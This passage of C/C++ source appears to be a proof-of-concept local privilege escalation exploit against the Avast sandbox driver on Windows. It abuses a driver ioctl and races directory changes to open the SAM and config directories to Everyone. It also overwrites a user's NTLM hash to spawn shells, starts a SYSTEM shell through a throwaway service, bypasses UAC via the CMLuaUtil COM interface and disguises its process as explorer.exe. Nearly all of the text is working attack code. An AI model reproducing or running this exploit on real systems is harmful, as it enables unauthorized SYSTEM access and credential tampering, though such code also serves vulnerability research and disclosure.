					ZeroMemory(&integrity, sizeof(integrity));
					integrity.Label.Attributes = SE_GROUP_INTEGRITY;
					integrity.Label.Sid = sid;
					if (SetTokenInformation(htoken2, TokenIntegrityLevel, &integrity, sizeof(integrity) + GetLengthSid(sid)) == 0) {
						wprintf(L"ERROR[SetTokenInformation]: %d\n", GetLastError());
					}
					LocalFree(sid);
					ImpersonateLoggedOnUser(htoken2);
					SC_HANDLE hmgr = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
					if (!hmgr)
					{
						printf("OpenSCManager failed with error : %d", GetLastError());
					}

					GUID uid = { 0 };
					RPC_WSTR wuid = { 0 };
					wchar_t* wuid2 = 0;
					UuidCreate(&uid);
					UuidToStringW(&uid, &wuid);
					wuid2 = (wchar_t*)wuid;

					wchar_t binpath[MAX_PATH] = { 0 };
					GetModuleFileName(GetModuleHandle(NULL), binpath, MAX_PATH);
					wchar_t servicecmd[MAX_PATH] = { 0 };
					DWORD currentsesid = 0;
					ProcessIdToSessionId(GetCurrentProcessId(), &currentsesid);
					wsprintf(servicecmd, L"\"%s\" %d", binpath, currentsesid);

					SC_HANDLE hsvc = CreateService(hmgr, wuid2, wuid2, GENERIC_ALL, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, servicecmd, NULL, NULL, NULL, NULL, NULL);
					if (!hsvc)
					{
						printf("CreateService Failed with error : %d\n", GetLastError());
					}
					else {
						printf("    SYSTEMShell : OK.\n");
					}

					StartService(hsvc, NULL, NULL);
					Sleep(100);
					DeleteService(hsvc);
					CloseServiceHandle(hsvc);
					CloseServiceHandle(hmgr);
					RevertToSelf();
					CloseHandle(htoken2);
					systemshelllaunched = true;
				}
				else {
					printf("    IsAdmin : FALSE\n");
				}


			}
			
			STARTUPINFO si = { 0 };
			PROCESS_INFORMATION pi = { 0 };
			
			if (!CreateProcessWithLogonW(username, NULL, newpassword_unistr, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\conhost.exe", NULL, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi))
			{
				printf("    Shell : Error %d\n", GetLastError());
			}
			else {
				printf("    Shell : OK.\n");
				if (pi.hProcess)
					CloseHandle(pi.hProcess);
				if (pi.hThread)
					CloseHandle(pi.hThread);
			}
			
			if (!ChangeUserPassword(username, newNTLM, NULL, realNTLMHash))
			{
				printf("    PasswordRestore : Error %d\n", GetLastError());
			}

			else {
				printf("    PasswordRestore : OK.\n");
			}
			CloseHandle(htoken);
		}

	}

	ORCloseHive(hSAMhive);
	printf("******************************************\n");
	free(newNTLM);
	return true;



}

bool IsRunningAsLocalSystem()
{

	HANDLE htoken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
		printf("OpenProcessToken failed, error : %d\n", GetLastError());
		return false;
	}
	TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
	DWORD retsz = 0;
	bool res = GetTokenInformation(htoken, TokenUser, tokenuser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retsz);
	CloseHandle(htoken);
	if (!res)
		return false;

	return IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
}

HANDLE GetAnonymousToken()
{
	ImpersonateAnonymousToken(GetCurrentThread());
	HANDLE hToken;
	OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hToken);
	RevertToSelf();

	PSECURITY_DESCRIPTOR pSD;
	ULONG sd_length;
	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;;GA;;;WD)(A;;GA;;;AN)", SDDL_REVISION_1, &pSD, &sd_length))
	{
		printf("Error converting SDDL: %d\n", GetLastError());
		exit(1);
	}

	TOKEN_DEFAULT_DACL dacl;
	BOOL bPresent;
	BOOL bDefaulted;
	PACL pDACL;
	GetSecurityDescriptorDacl(pSD, &bPresent, &pDACL, &bDefaulted);
	dacl.DefaultDacl = pDACL;

	if (!SetTokenInformation(hToken, TokenDefaultDacl, &dacl, sizeof(dacl)))
	{
		printf("Error setting default DACL: %d\n", GetLastError());
		exit(1);
	}

	return hToken;
}


#define T_CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define T_IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"
#define T_ELEVATION_MONIKER_ADMIN            L"Elevation:Administrator!new:"

#define UCM_DEFINE_GUID(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
     EXTERN_C const GUID DECLSPEC_SELECTANY name \
                = { l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 } }  

UCM_DEFINE_GUID(IID_ICMLuaUtil, 0x6EDD6D74, 0xC007, 0x4E75, 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C);

typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {

	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE* QueryInterface)(
			__RPC__in ICMLuaUtil* This,
			__RPC__in REFIID riid,
			_COM_Outptr_  void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(
		__RPC__in ICMLuaUtil* This);

	ULONG(STDMETHODCALLTYPE* Release)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* SetRasCredentials)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* SetRasEntryProperties)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* DeleteRasEntry)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* LaunchInfSection)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* LaunchInfSectionEx)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* CreateLayerDirectory)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* ShellExec)(
		__RPC__in ICMLuaUtil* This,
		_In_     LPCTSTR lpFile,
		_In_opt_  LPCTSTR lpParameters,
		_In_opt_  LPCTSTR lpDirectory,
		_In_      ULONG fMask,
		_In_      ULONG nShow);

	END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil{ CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl; };


/*
* ucmAllocateElevatedObject
*
* Purpose:
*
* CoGetObject elevation as admin.
*
*/
HRESULT ucmAllocateElevatedObject(
	_In_ LPWSTR lpObjectCLSID,
	_In_ REFIID riid,
	_In_ DWORD dwClassContext,
	_Outptr_ void** ppv
)
{
	BOOL        bCond = FALSE;
	DWORD       classContext;
	HRESULT     hr = E_FAIL;
	PVOID       ElevatedObject = NULL;

	BIND_OPTS3  bop;
	WCHAR       szMoniker[MAX_PATH];

	do {

		if (wcslen(lpObjectCLSID) > 64)
			break;

		RtlSecureZeroMemory(&bop, sizeof(bop));
		bop.cbStruct = sizeof(bop);

		classContext = dwClassContext;
		if (dwClassContext == 0)
			classContext = CLSCTX_LOCAL_SERVER;

		bop.dwClassContext = classContext;

		wcscpy(szMoniker, T_ELEVATION_MONIKER_ADMIN);
		wcscat(szMoniker, lpObjectCLSID);

		hr = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);

	} while (bCond);

	*ppv = ElevatedObject;

	return hr;
}


/*
* ucmCMLuaUtilShellExecMethod
*
* Purpose:
*
* Bypass UAC using AutoElevated undocumented CMLuaUtil interface.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
NTSTATUS ucmCMLuaUtilShellExecMethod(
	_In_ LPWSTR lpszExecutable
)
{
	NTSTATUS         MethodResult = STATUS_ACCESS_DENIED;
	HRESULT          r = E_FAIL, hr_init;
	BOOL             bApprove = FALSE;
	ICMLuaUtil* CMLuaUtil = NULL;

	hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

	do {

		r = ucmAllocateElevatedObject(
			(wchar_t*)T_CLSID_CMSTPLUA,
			IID_ICMLuaUtil,
			CLSCTX_LOCAL_SERVER | CLSCTX_ENABLE_CLOAKING,
			(void**)&CMLuaUtil);

		if (r != S_OK)
			break;

		if (CMLuaUtil == NULL) {
			r = E_OUTOFMEMORY;
			break;
		}

		r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
			lpszExecutable,
			NULL,
			NULL,
			SEE_MASK_DEFAULT,
			SW_SHOW);

		if (SUCCEEDED(r))
			MethodResult = STATUS_SUCCESS;

	} while (FALSE);

	if (CMLuaUtil != NULL) {
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}

	if (hr_init == S_OK)
		CoUninitialize();

	return MethodResult;
}

BOOL MasqueradePEB() {


	typedef struct _UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR  Buffer;
	} UNICODE_STRING, * PUNICODE_STRING;

	typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
		HANDLE ProcessHandle,
		DWORD ProcessInformationClass,
		PVOID ProcessInformation,
		DWORD ProcessInformationLength,
		PDWORD ReturnLength
		);

	typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef void (WINAPI* _RtlInitUnicodeString)(
		PUNICODE_STRING DestinationString,
		PCWSTR SourceString
		);

	typedef struct _LIST_ENTRY {
		struct _LIST_ENTRY* Flink;
		struct _LIST_ENTRY* Blink;
	} LIST_ENTRY, * PLIST_ENTRY;

	typedef struct _PROCESS_BASIC_INFORMATION
	{
		LONG ExitStatus;
		PVOID PebBaseAddress;
		ULONG_PTR AffinityMask;
		LONG BasePriority;
		ULONG_PTR UniqueProcessId;
		ULONG_PTR ParentProcessId;
	} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

	typedef struct _PEB_LDR_DATA {
		ULONG Length;
		BOOLEAN Initialized;
		HANDLE SsHandle;
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
		PVOID EntryInProgress;
		BOOLEAN ShutdownInProgress;
		HANDLE ShutdownThreadId;
	} PEB_LDR_DATA, * PPEB_LDR_DATA;

	typedef struct _RTL_USER_PROCESS_PARAMETERS {
		BYTE           Reserved1[16];
		PVOID          Reserved2[10];
		UNICODE_STRING ImagePathName;
		UNICODE_STRING CommandLine;
	} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

	// Partial PEB
	typedef struct _PEB {
		BOOLEAN InheritedAddressSpace;
		BOOLEAN ReadImageFileExecOptions;
		BOOLEAN BeingDebugged;
		union
		{
			BOOLEAN BitField;
			struct
			{
				BOOLEAN ImageUsesLargePages : 1;
				BOOLEAN IsProtectedProcess : 1;
				BOOLEAN IsLegacyProcess : 1;
				BOOLEAN IsImageDynamicallyRelocated : 1;
				BOOLEAN SkipPatchingUser32Forwarders : 1;
				BOOLEAN SpareBits : 3;
			};
		};
		HANDLE Mutant;

		PVOID ImageBaseAddress;
		PPEB_LDR_DATA Ldr;
		PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
		PVOID SubSystemData;
		PVOID ProcessHeap;
		PRTL_CRITICAL_SECTION FastPebLock;
	} PEB, * PPEB;

	typedef struct _LDR_DATA_TABLE_ENTRY {
		LIST_ENTRY InLoadOrderLinks;
		LIST_ENTRY InMemoryOrderLinks;
		union
		{
			LIST_ENTRY InInitializationOrderLinks;
			LIST_ENTRY InProgressLinks;
		};
		PVOID DllBase;
		PVOID EntryPoint;
		ULONG SizeOfImage;
		UNICODE_STRING FullDllName;
		UNICODE_STRING BaseDllName;
		ULONG Flags;
		WORD LoadCount;
		WORD TlsIndex;
		union
		{
			LIST_ENTRY HashLinks;
			struct
			{
				PVOID SectionPointer;
				ULONG CheckSum;
			};
		};
		union
		{
			ULONG TimeDateStamp;
			PVOID LoadedImports;
		};
	} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

	DWORD dwPID;
	PROCESS_BASIC_INFORMATION pbi;
	PPEB peb;
	PPEB_LDR_DATA pld;
	PLDR_DATA_TABLE_ENTRY ldte;

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
	if (NtQueryInformationProcess == NULL) {
		return FALSE;
	}

	_RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEnterCriticalSection");
	if (RtlEnterCriticalSection == NULL) {
		return FALSE;
	}

	_RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlLeaveCriticalSection");
	if (RtlLeaveCriticalSection == NULL) {
		return FALSE;
	}

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	dwPID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	// Retrieves information about the specified process.
	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	// Read pbi PebBaseAddress into PEB Structure
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
		return FALSE;
	}

	// Read Ldr Address into PEB_LDR_DATA Structure
	if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) {
		return FALSE;
	}

	// Let's overwrite UNICODE_STRING structs in memory

	// First set Explorer.exe location buffer
	WCHAR chExplorer[MAX_PATH + 1];
	GetWindowsDirectory(chExplorer, MAX_PATH);
	wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), L"\\explorer.exe");

	LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
	wcscpy_s(pwExplorer, MAX_PATH, chExplorer);

	// Take ownership of PEB
	RtlEnterCriticalSection(peb->FastPebLock);

	// Masquerade ImagePathName and CommandLine 
	RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
	RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);

	// Masquerade FullDllName and BaseDllName
	WCHAR wFullDllName[MAX_PATH];
	WCHAR wExeFileName[MAX_PATH];
	GetModuleFileName(NULL, wExeFileName, MAX_PATH);

	LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
	LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
	do
	{
		// Read InLoadOrderModuleList.Flink Address into LDR_DATA_TABLE_ENTRY Structure
		if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) {
			return FALSE;
		}

		// Read FullDllName into string
		if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
		{
			return FALSE;
		}

		if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
			RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
			RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
			break;
		}

		pNextModuleInfo = ldte->InLoadOrderLinks.Flink;

	} while (pNextModuleInfo != pStartModuleInfo);

	//Release ownership of PEB
	RtlLeaveCriticalSection(peb->FastPebLock);

	// Release Process Handle
	CloseHandle(hProcess);

	if (_wcsicmp(chExplorer, wFullDllName) == 0) {
		return FALSE;
	}

	return TRUE;
}




void LaunchConsoleInSessionId()
{
	if (GetModuleHandle(L"snxhk.dll")) {

		{
			HANDLE hclient = CreateFile(L"\\\\.\\pipe\\PRETTYPRAGUE", GENERIC_READ | GENERIC_WRITE, ALL_SHARING, NULL, OPEN_EXISTING, NULL, NULL);
			if (!hclient || hclient == INVALID_HANDLE_VALUE)
				ExitProcess(1);
			DWORD sesid = 0;
			bool ret = GetNamedPipeServerSessionId(hclient, &sesid);
			CloseHandle(hclient);

			if (ret)
			{
				HANDLE htoken = NULL;
				if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken))
					return;

				SetPrivilege(htoken, SE_TCB_NAME, TRUE);
				SetPrivilege(htoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
				SetPrivilege(htoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
				SetPrivilege(htoken, SE_IMPERSONATE_NAME, TRUE);
				SetPrivilege(htoken, SE_DEBUG_NAME, TRUE);

				HANDLE hnewtoken = NULL;
				bool res = DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hnewtoken);
				CloseHandle(htoken);
				if (!res)
					return;

				res = SetTokenInformation(hnewtoken, TokenSessionId, &sesid, sizeof(DWORD));
				if (!res)
				{
					CloseHandle(hnewtoken);
					return;
				}
				ImpersonateLoggedOnUser(hnewtoken);
			}
		}
		wchar_t unsbxapp[MAX_PATH] = { 0 };
		GetModuleFileName(GetModuleHandle(NULL), unsbxapp, MAX_PATH);
		ucmCMLuaUtilShellExecMethod((wchar_t*)L"C:\\Windows\\System32\\cmd.exe");
	}
	else {

		HANDLE hclient = CreateFile(L"\\\\.\\pipe\\PRETTYPRAGUE", GENERIC_READ | GENERIC_WRITE, ALL_SHARING, NULL, OPEN_EXISTING, NULL, NULL);
		if (!hclient || hclient == INVALID_HANDLE_VALUE)
			ExitProcess(1);
		DWORD sesid = 0;
		bool ret = GetNamedPipeServerSessionId(hclient, &sesid);
		CloseHandle(hclient);
	
		if (ret)
		{
			HANDLE htoken = NULL;
			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken))
				return;

			SetPrivilege(htoken, SE_TCB_NAME, TRUE);
			SetPrivilege(htoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
			SetPrivilege(htoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
			SetPrivilege(htoken, SE_IMPERSONATE_NAME, TRUE);
			SetPrivilege(htoken, SE_DEBUG_NAME, TRUE);

			HANDLE hnewtoken = NULL;
			bool res = DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hnewtoken);
			CloseHandle(htoken);
			if (!res)
				return;

			res = SetTokenInformation(hnewtoken, TokenSessionId, &sesid, sizeof(DWORD));
			if (!res)
			{
				CloseHandle(hnewtoken);
				return;
			}

			STARTUPINFO si = { 0 };
			PROCESS_INFORMATION pi = { 0 };
			CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
			CloseHandle(hnewtoken);

			if (pi.hProcess)
				CloseHandle(pi.hProcess);
			if (pi.hThread)
				CloseHandle(pi.hThread);
			return;
		}
	}

	return;

}





DWORD WINAPI Worker(void*)
{
    HANDLE hfile = CreateFile(L"C:\\Windows\\System32\\config\\SAM", GENERIC_READ | FILE_WRITE_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    return ERROR_SUCCESS;
}
int SandboxedMain()
{

    wchar_t windir[MAX_PATH] = { 0 };
    GetWindowsDirectory(windir, MAX_PATH);
    wchar_t ntwindir[MAX_PATH] = { L"\\??\\" };
    wcscat(ntwindir, windir);
    UNICODE_STRING _ntwindir = { 0 };
    RtlInitUnicodeString(&_ntwindir, ntwindir);
    OBJECT_ATTRIBUTES objattr_windir = { 0 };
    InitializeObjectAttributes(&objattr_windir, &_ntwindir, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hwindir = NULL;
    IO_STATUS_BLOCK iostat = { 0 };
    NTSTATUS stat = NtCreateFile(&hwindir, GENERIC_WRITE | SYNCHRONIZE | READ_CONTROL | WRITE_DAC, &objattr_windir, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, ALL_SHARING, FILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
    if (stat)
    {
        printf("Failed to create windows directory, error : 0x%0.8X\n", stat);
        return 1;
    }
    wchar_t ntsysdir[MAX_PATH] = { 0 };
    wsprintf(ntsysdir, L"%ws\\System32", ntwindir);
    UNICODE_STRING _ntsysdir = { 0 };
    RtlInitUnicodeString(&_ntsysdir, ntsysdir);
    OBJECT_ATTRIBUTES objattr_sysdir = { 0 };
    InitializeObjectAttributes(&objattr_sysdir, &_ntsysdir, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hsysdir = NULL;
    iostat = { 0 };
    stat = NtCreateFile(&hsysdir, GENERIC_WRITE | SYNCHRONIZE | READ_CONTROL | WRITE_DAC, &objattr_sysdir, &iostat, NULL, NULL, ALL_SHARING, FILE_OPEN_IF, FILE_DIRECTORY_FILE, NULL, NULL);
    if (stat)
    {
        printf("Failed to create system32 directory, error : 0x%0.8X\n", stat);
        return 1;
    }
    wchar_t ntcfgdir[MAX_PATH] = { 0 };
    wsprintf(ntcfgdir, L"%ws\\config", ntsysdir);
    UNICODE_STRING _ntcfgdir = { 0 };
    RtlInitUnicodeString(&_ntcfgdir, ntcfgdir);
    OBJECT_ATTRIBUTES objattr_ntcfgdir = { 0 };
    InitializeObjectAttributes(&objattr_ntcfgdir, &_ntcfgdir, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hcfgdir = NULL;
    iostat = { 0 };
    stat = NtCreateFile(&hcfgdir, FILE_READ_DATA | GENERIC_WRITE | SYNCHRONIZE | READ_CONTROL | WRITE_DAC, &objattr_ntcfgdir, &iostat, NULL, NULL, ALL_SHARING, FILE_OPEN_IF, FILE_DIRECTORY_FILE, NULL, NULL);
    if (stat)
    {
        printf("Failed to create config directory, error : 0x%0.8X\n", stat);
        return 1;
    }
    DWORD tid = NULL;
    HANDLE hthread = CreateThread(NULL, NULL, Worker, NULL, CREATE_SUSPENDED, &tid);

    OVERLAPPED ovp = { 0 };
    ovp.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    bool isresumed = false;
    do {
        char buff[0x1000] = { 0 };
        DWORD retbytes = 0;
        ReadDirectoryChangesW(hcfgdir, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_SECURITY, &retbytes, &ovp, NULL);
        if (!isresumed)
        {
            ResumeThread(hthread);
            isresumed = true;
        }
        WaitForSingleObject(ovp.hEvent, INFINITE);
        SuspendThread(hthread);
        break;
    } while (1);
    PSECURITY_DESCRIPTOR pSD = NULL;
    PSID pEveryoneSID = NULL;
    PACL pAcl = NULL;
    SID_IDENTIFIER_AUTHORITY worldAuth = SECURITY_WORLD_SID_AUTHORITY;
    if (!AllocateAndInitializeSid(&worldAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSID)) {
        std::wcerr << L"[-] Failed to allocate Everyone SID. Error: " << GetLastError() << std::endl;
        return 1;
    }
    EXPLICIT_ACCESSW ea = {};
    ea.grfAccessPermissions = FILE_ALL_ACCESS;
    ea.grfAccessMode = GRANT_ACCESS;
    ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (LPWSTR)pEveryoneSID;

    DWORD dwRes = SetEntriesInAclW(1, &ea, NULL, &pAcl);
    if (ERROR_SUCCESS != dwRes) {
        std::wcerr << L"[-] Failed to create ACL. Error: " << dwRes << std::endl;
        return 1;
    }

    pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
    if (!pSD) {
        std::wcerr << L"[-] Memory allocation failed for Security Descriptor." << std::endl;
        return 1;
    }

    if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION)) {
        std::wcerr << L"[-] Failed to initialize security descriptor. Error: " << GetLastError() << std::endl;
        return 1;
    }

    if (!SetSecurityDescriptorDacl(pSD, TRUE, pAcl, FALSE)) {
        std::wcerr << L"[-] Failed to set security descriptor DACL. Error: " << GetLastError() << std::endl;
        return 1;
    }
    NTSTATUS status = NtSetSecurityObject(hcfgdir, DACL_SECURITY_INFORMATION, pSD);
    status = NtSetSecurityObject(hwindir, DACL_SECURITY_INFORMATION, pSD);
    status = NtSetSecurityObject(hsysdir, DACL_SECURITY_INFORMATION, pSD);
    printf("NtSetSecurityObject : 0x%0.8X\n", status);
    return 0;
}

bool RRemoveDirectory(const wchar_t* dirname)
{
    if (!dirname)
        return false;
    wchar_t srch[MAX_PATH] = { 0 };
    wsprintf(srch, L"%ws\\*.*", dirname);
    WIN32_FIND_DATA wfd = { 0 };
    HANDLE hfind = FindFirstFile(srch, &wfd);
    if (!hfind || hfind == INVALID_HANDLE_VALUE)
        return false;

    do {
        wfd = { 0 };
        FindNextFile(hfind, &wfd);
        if (GetLastError() == ERROR_NO_MORE_FILES)
            break;
        if (_wcsicmp(wfd.cFileName, L".") == 0 || _wcsicmp(wfd.cFileName, L"..") == 0)
            continue;
        wchar_t nextobj[MAX_PATH] = { 0 };
        wsprintf(nextobj, L"%ws\\%ws", dirname, wfd.cFileName);
        if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            RRemoveDirectory(nextobj);
            continue;
        }
        else {
            DeleteFile(nextobj);
        }
    } while (1);
    FindClose(hfind);
    return RemoveDirectory(dirname);
}

int main(int argc, char** argv)
{


	if (IsRunningAsLocalSystem())
	{
		printf("Running as local system.\n");
		
		LaunchConsoleInSessionId();

		return 0;
	}
    if (GetModuleHandle(L"snxhk.dll"))
        return SandboxedMain();
	HANDLE hpipe = CreateNamedPipe(L"\\\\.\\pipe\\PRETTYPRAGUE", PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, NULL, 1, NULL, NULL, NULL, NULL);


    wchar_t sbxapp[MAX_PATH] = { 0 };
    GetModuleFileName(GetModuleHandle(NULL), sbxapp, MAX_PATH);
    HANDLE hsnx = CreateFile(L"\\\\.\\aswSnx", GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hsnx || hsnx == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open kernel endpoint, error : %d\n", GetLastError());
        return 1;
    }
    HANDLE hsbx = CreateFile(sbxapp, FILE_READ_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, NULL, NULL);
    if (!hsnx || hsnx == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open sandboxed app file, error : %d\n", GetLastError());
        return 1;
    }
    char buff[0x1028] = { 0 };
    buff[0] = 0x1 | 0x20;
    wcscpy((wchar_t*)&buff[2074], sbxapp);
    memmove(&buff[24], &hsbx, sizeof(hsbx));
    DWORD retb = 0;
    bool res = DeviceIoControl(hsnx, 0x82AC0054, buff, sizeof(buff), buff, sizeof(buff), &retb, NULL);
    if (!res)
    {
        printf("DeviceIoControl failed error : %d\n", GetLastError());
    }

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    res = CreateProcess(sbxapp, NULL, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (!res)
    {
        printf("CreateProcess failed error : %d\n", GetLastError());
    }
    UNICODE_STRING aswdir = { 0 };
    RtlInitUnicodeString(&aswdir, (wchar_t*)L"\\??\\C:\\avast! sandbox");
    OBJECT_ATTRIBUTES objattr = { 0 };
    InitializeObjectAttributes(&objattr, &aswdir, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE haswdir = NULL;
    IO_STATUS_BLOCK iostat = { 0 };
    res = NtCreateFile(&haswdir, FILE_READ_DATA | SYNCHRONIZE, &objattr, &iostat, NULL, NULL, ALL_SHARING, FILE_OPEN_IF, FILE_DIRECTORY_FILE, NULL, NULL);
    if (res)
    {
        printf("Failed to open avast sandboxed directory, error : 0x%0.8X\n", res);
        return 1;
    }
    OVERLAPPED ovp = { 0 };
    ovp.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    bool isresumed = false;
    wchar_t sam[] = { L"SAM" };
    wchar_t fullsam[MAX_PATH] = { L"\\??\\C:\\avast! sandbox\\" };
    do {
        ResetEvent(ovp.hEvent);
        char buff[0x1000] = { 0 };
        DWORD retbytes = 0;
        ReadDirectoryChangesW(haswdir, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &retbytes, &ovp, NULL);
        if (!isresumed)
        {
            NtResumeProcess(pi.hProcess);
            isresumed = true;
        }
        WaitForSingleObject(ovp.hEvent, INFINITE);
        PFILE_NOTIFY_INFORMATION fni = (PFILE_NOTIFY_INFORMATION)buff;
        if (fni->Action != FILE_ACTION_ADDED)
            continue;
